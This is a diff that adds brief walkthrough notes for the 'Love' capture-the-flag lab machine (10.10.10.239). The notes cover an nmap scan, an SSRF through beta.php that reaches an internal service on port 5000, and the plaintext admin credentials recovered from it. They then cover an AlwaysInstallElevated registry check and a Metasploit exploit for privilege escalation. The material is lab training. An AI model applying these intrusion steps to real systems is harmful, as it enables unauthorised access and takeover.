@@ -1,0 +1,28 @@
+nmap -sC -sV -oA initial 10.10.10.239
+
+add to /etc/hosts
+    10.10.10.239    staging.love.htb
+
+go to http://staging.love.htb/beta.php
+
+Notice you can't access 5000
+
+in beta.php
+    http://127.0.0.1:5000
+
+Vote Admin Creds admin: @LoveIsInTheAir!!!! 
+
+dirb http://10.10.10.239/
+
+go to /admin/
+
+login
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+search on msfconsole AlwaysInstallElevated
+
+exploit!
+
+
+
